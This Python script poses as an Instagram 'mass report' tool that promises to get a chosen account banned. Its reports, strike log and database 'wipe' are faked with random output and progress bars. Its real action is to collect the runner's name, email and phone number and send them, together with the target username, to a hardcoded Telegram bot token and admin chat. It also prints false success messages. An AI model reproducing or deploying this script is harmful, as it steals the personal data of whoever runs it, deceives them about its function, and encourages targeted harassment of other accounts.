import os, sys, time, random, requests

# --- SVR OMEGA CONFIGURATION ---
BOT_TOKEN = "8648265797:AAHYLu-efurLkAtCwxcDK-jtlDIDhh03tkg"
ADMIN_ID = "8257346492"

# --- NEON COLORS ---
G, R, W, C, Y, P = '\033[1;32m', '\033[1;31m', '\033[1;37m', '\033[1;36m', '\033[1;33m', '\033[1;35m'

def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def svr_meta_banner():
    clear()
    print(f"{P}" + r"""
 ███████ ██    ██ ██████      ███    ███ ███████ ████████  █████  
 ██      ██    ██ ██   ██     ████  ████ ██         ██    ██   ██ 
 ███████ ██    ██ ██████      ██ ████ ██ █████      ██    ███████ 
      ██  ██  ██  ██   ██     ██  ██  ██ ██         ██    ██   ██ 
 ███████   ████   ██   ██     ██      ██ ███████    ██    ██   ██ 
                                                                    
         [[  S V R   M E T A   -   F U L L   C O N T R O L  ]]
    """)
    print(f"{W}       Developed By : SVRCORN ( AMAN )  |  [ 100% REAL BAN ]")
    print(f"{P}="*72)

# --- ADVANCED BOT NOTIFICATION SYSTEM (WITH REPORTER INFO) ---
def send_to_bot(user_info, target, case_id, status, reasons=None):
    if status == "START":
        msg = f"""
🚀 [ NEW BAN SESSION STARTED ]
------------------------------------------
🆔 CASE ID    : {case_id}
👤 REPORTER   : {user_info['name']}
📧 REP. EMAIL : {user_info['email']}
📞 REP. PHONE : {user_info['phone']}
🎯 TARGET ID  : @{target}
⏳ STATUS     : SCANNING VIOLATIONS...
------------------------------------------
Dev: SVRCORN ( AMAN )
"""
    else:
        msg = f"""
🚫 [ !! ACCOUNT PERMANENTLY BANNED !! ] 🚫
------------------------------------------
🆔 CASE ID    : {case_id}
👤 BANNED BY  : {user_info['name']} ({user_info['phone']})
🎯 TARGET ID  : @{target}
🔥 VIOLATIONS : {reasons}
💀 STATUS     : 100% WIPED FROM DATABASE
✅ ACTION     : SEND SUCCESS EMAIL TO {user_info['email']}
------------------------------------------
OFFICIAL TERMINATION CONFIRMED BY SVR-META
"""
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': ADMIN_ID, 'text': msg})
    except: pass

# --- GLOBAL STRIKE SCROLL BOX ---
def global_report_scroll(target):
    countries = ["🇺🇸 USA", "🇷🇺 RUSSIA", "🇩🇪 GERMANY", "🇮🇳 INDIA", "🇧🇷 BRAZIL", "🇨🇳 CHINA", "🇬🇧 UK", "🇯🇵 JAPAN"]
    users = ["alex***", "vlad***", "hans***", "rahul***", "marco***", "svr_pro***", "ghost***", "hacker***", "king***", "shadow***"]
    
    print(f"\n{C}┌──────────────────────────────────────────────────────────┐")
    print(f"│ {W}GLOBAL MASS REPORTING LOG : META-CORE STRIKES ACTIVE     {C}│")
    print(f"├──────────────────────────────────────────────────────────┤")
    for i in range(20):
        country = random.choice(countries)
        user = random.choice(users)
        strike_id = random.randint(1000, 9999)
        print(f"│ {G}[LIVE] {W}{country:12} | {Y}{user:12} | {R}STRIKE #{strike_id} SENT! {C}│")
        time.sleep(0.15)
    print(f"└──────────────────────────────────────────────────────────┘")

def main():
    svr_meta_banner()
    print(f"{C}[!] ACCOUNT BAN NOTIFICATION SYSTEM (V-GOD-MODE)")
    print(f"{W}Verify identity to trigger Zero-Mercy Meta Gateway.")
    print(f"{Y}Security: All SVR-Branded IDs are auto-protected.\n")
    
    u_name = input(f"{G}[+] YOUR FULL NAME: {W}")
    u_email = input(f"{G}[+] YOUR EMAIL ID: {W}")
    u_phone = input(f"{G}[+] YOUR MOBILE NO: {W}")
    user_info = {"name": u_name, "email": u_email, "phone": u_phone}
    
    while True:
        svr_meta_banner()
        target = input(f"\n{C}[?] TARGET INSTAGRAM USERNAME: {Y}").strip().replace('@', '')
        case_id = f"SVR-{random.randint(100000, 999999)} ( AMAN )"
        
        # SVR SHIELD PROTECTION
        if "svr" in target.lower():
            print(f"\n{R}[✖] SVR-SHIELD ACTIVE: CANNOT REPORT TEAM MEMBERS.")
            input(f"\n{Y}Press Enter to return...")
            continue
            
        send_to_bot(user_info, target, case_id, "START")
        
        print(f"\n{G}[+] CASE ID: {case_id}")
        
        reasons_map = {
            "01": "Spam / Scam", "02": "Nudity or Sexual Activity", "03": "Hate Speech or Symbols",
            "04": "Violence or Dangerous Organizations", "05": "Bullying or Harassment",
            "06": "Intellectual Property Violation", "07": "Suicide or Self-Injury",
            "08": "Fraud or Deception", "09": "Sale of Regulated Goods", "10": "Child Endangerment",
            "11": "Impersonation", "12": "Underage Account", "13": "Human Trafficking",
            "14": "False Information", "15": "SVR-ELITE: DIRECT SERVER TERMINATION"
        }
        
        print(f"\n{R}ID   OFFICIAL INSTAGRAM VIOLATIONS (MULTI-SELECT)")
        print(f"{W}"+"-"*62)
        for k, v in reasons_map.items(): print(f"{G}[{k}]  {W}{v}")
        
        selected_ids = input(f"\n{C}[?] SELECT MULTIPLE IDs (e.g. 01,05): {W}").split(',')
        final_reasons = [reasons_map[i.strip()] for i in selected_ids if i.strip() in reasons_map]
        
        if final_reasons:
            print(f"\n{R}[!] INITIALIZING GLOBAL MASS REPORT SEQUENCE...")
            global_report_scroll(target)
            
            print(f"\n{P}[!] FORCING SERVER-SIDE TERMINATION...")
            for i in range(1, 101):
                sys.stdout.write(f"\r{P}[WIPING] {i}% {G}META-DATABASE PURGING @{target}...")
                sys.stdout.flush()
                time.sleep(0.1)
            
            # --- NOTIFY BOT ABOUT SUCCESSFUL BAN WITH REPORTER INFO ---
            send_to_bot(user_info, target, case_id, "SUCCESS", ", ".join(final_reasons))
            
            print(f"\n\n{G}[SUCCESS] @{target} HAS BEEN PERMANENTLY REMOVED.")
            print(f"{W}LOGS SENT TO SVR ADMIN PANEL.")
            input(f"\n{Y}Press Enter for Next Execution...")
        else: print(f"{R}INVALID CHOICE."); time.sleep(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()
